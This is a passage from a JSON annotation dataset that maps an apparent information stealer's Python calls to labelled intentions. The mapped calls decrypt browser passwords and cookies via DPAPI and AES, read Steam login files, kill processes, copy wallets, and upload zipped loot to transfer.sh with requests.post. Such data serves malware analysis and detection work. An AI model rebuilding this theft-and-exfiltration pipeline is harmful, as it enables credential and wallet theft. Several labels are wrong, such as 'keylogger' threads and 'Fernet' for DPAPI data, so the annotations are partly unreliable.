              "intention_id": "delete_temporary_database"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "pathKey, \"r\", encoding=\"utf-8\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "f.read()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state[\"os_crypt\"][\"encrypted_key\"]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key[5:]",
              "object_description": "Fernet-encrypted byte string",
              "object_id": "fernet_encrypted_bytes",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "Value_Dcryptage()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "row[2], master_key",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "writeforfile()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "NotPSSW, \"bc_allpasswords\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write password data to file",
              "intention_id": "write_password_data_file"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.stat()",
              "action_description": "Retrieves file status",
              "action_id": "path_object_operations",
              "object": "pathC",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "pathC, tempfold",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "tempfold",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT host_key, name, encrypted_value FROM cookies\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser cookies",
              "intention_id": "query_browser_cookies"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser cookies data",
              "intention_id": "extract_browser_cookies_data"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "tempfold",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Delete temporary database",
              "intention_id": "delete_temporary_database"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "pathKey, \"r\", encoding=\"utf-8\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "f.read()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state[\"os_crypt\"][\"encrypted_key\"]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key[5:]",
              "object_description": "Fernet-encrypted byte string",
              "object_id": "fernet_encrypted_bytes",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "Value_Dcryptage()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "row[2], master_key",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt browser cookie",
              "intention_id": "decrypt_browser_cookie"
            },
            {
              "action_api": "writeforfile()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "Cookies, \"bc_allcookies\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "psutil.process_iter()",
              "action_description": "Iterates over all running processes",
              "action_id": "iterate_processes",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "proc.name()",
              "action_description": "Retrieves process name",
              "action_id": "get_process_name",
              "object": "",
              "object_description": "Process name",
              "object_id": "get_process_name",
              "intention_description": "Collect process name",
              "intention_id": "collect_process_name"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "pathC",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "f\"taskkill /im {procc} /t /f\", shell=True",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "f\"{pathC}/loginusers.vdf\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "pathC",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "zf.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "pathC + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Add file to archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "zf.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "upload()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "f\"{pathC}/{name}.zip\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "f\"{pathC}/{name}.zip\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=Find_Passw, args=[patt[0], patt[3]]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in child process",
              "intention_id": "run_function_child_process"
            },
            {
              "action_api": "a.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=Get_Bc_Cook, args=[patt[0], patt[4]]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in child process",
              "intention_id": "run_function_child_process"
            },
            {
              "action_api": "a.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for keylogger thread to finish",
              "intention_id": "wait_keylogger_thread_finish"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=ZipMyThings, args=[patt[0], patt[5], patt[1]]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in child process",
              "intention_id": "run_function_child_process"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=ZipMyThings, args=[patt[0], patt[2], patt[1]]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in child process",
              "intention_id": "run_function_child_process"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for keylogger thread to finish",
              "intention_id": "wait_keylogger_thread_finish"
            },
            {
              "action_api": "upload()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "os.getenv(\"TEMP\") + \"\\\\\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path, mode=\"rb\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "\"https://transfer.sh/\", files=files",
              "object_description": "File transfer service URL",
              "object_id": "file_sharing_endpoint",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "pathF",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "pathF + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "UploadTo_Anon()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "pathF + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "path + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "UploadTo_Anon()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "path + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "path + \"/\" + file",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "CreateFolder_()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "target, keywords",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=bc_create_file, args=[patt, key_wordsFiles]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in child process",
              "intention_id": "run_function_child_process"
            },
            {
              "action_api": "check_spec_bc.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for keylogger thread to finish",
              "intention_id": "wait_keylogger_thread_finish"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "0.2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "upload()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "\"check_spec_bc\", filetext",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Transmit file data to server",
              "intention_id": "transmit_file_data_server"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=auto_copy_wallet().run",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in child process",
              "intention_id": "run_function_child_process"
            },
            {
              "action_api": "auto.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            }
          ]
        }
      ]
    }
  ]
}